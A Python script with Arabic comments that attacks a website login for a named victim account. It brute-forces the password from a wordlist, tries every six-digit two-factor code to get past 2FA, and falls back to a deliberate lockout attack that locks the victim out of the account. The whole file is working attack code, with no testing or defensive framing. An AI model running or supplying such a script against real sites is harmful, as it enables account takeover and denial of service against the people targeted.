import requests
import time
from itertools import product

# ---------------------- إعدادات الموقع ----------------------
login_url = "https://yourwebsite.com/login"
twofa_url = "https://yourwebsite.com/2fa"  # رابط إدخال رمز 2FA

# ---------------------- معلومات الحساب المستهدف ----------------------
email = "victim@example.com"
wordlist = "passwords.txt"  # ملف يحتوي على كلمات السر المحتملة

# إنشاء جلسة للحفاظ على الاتصال بعد تسجيل الدخول
session = requests.Session()

# ---------------------- مرحلة 1: تخمين كلمة السر ----------------------
def brute_force():
    with open(wordlist, "r") as file:
        for password in file:
            password = password.strip()
            data = {"email": email, "password": password}
            response = session.post(login_url, data=data)

            if "2fa required" in response.text.lower():
                print(f"[+] تسجيل الدخول ناجح بكلمة السر: {password}")
                return password  # وجد كلمة السر، ننتقل إلى اختراق 2FA

            elif "incorrect password" not in response.text.lower():
                print(f"[+] تسجيل الدخول ناجح بدون 2FA بكلمة السر: {password}")
                return password

            else:
                print(f"[-] فشل التخمين: {password}")
    
    return None  # لم يتم العثور على كلمة السر

# ---------------------- مرحلة 2: تخطي المصادقة الثنائية ----------------------
def bypass_2fa():
    print("\n[!] بدء هجوم التخمين على 2FA...")
    
    for code in product("0123456789", repeat=6):  # يجرب جميع الأكواد الممكنة (6 أرقام)
        code = "".join(code)
        data = {"email": email, "2fa_code": code}
        response = session.post(twofa_url, data=data)

        if "incorrect" not in response.text.lower():
            print(f"[+] تم تجاوز 2FA بالكود: {code}")
            return True
        
        else:
            print(f"[-] تجربة كود: {code}")

    print("[!] جميع الأكواد خاطئة، لم يتم تجاوز 2FA.")
    return False

# ---------------------- مرحلة 3: إغلاق الحساب بهجوم الضغط ----------------------
def account_lockout_attack():
    print("\n[!] بدء هجوم الضغط على الحساب 🚀...")
    
    for i in range(50):  # 50 محاولة تسجيل دخول متتالية
        data = {"email": email, "password": f"wrong_password_{i}"}
        response = requests.post(login_url, data=data)

        print(f"[!] محاولة {i+1} لإغلاق الحساب")
        time.sleep(1)  # انتظار 1 ثانية بين المحاولات لتجنب الحظر السريع

    print("[!] الهجوم انتهى، تحقق من حالة الحساب!")

# ---------------------- تنفيذ الهجوم ----------------------
if __name__ == "__main__":
    password = brute_force()
    
    if password:
        success = bypass_2fa()
        if not success:
            print("[!] 2FA لم يتم تخطيه، تجربة إغلاق الحساب الآن!")
            account_lockout_attack()
    else:
        print("[!] فشل تخمين كلمة السر، تجربة إغلاق الحساب مباشرة!")
        account_lockout_attack()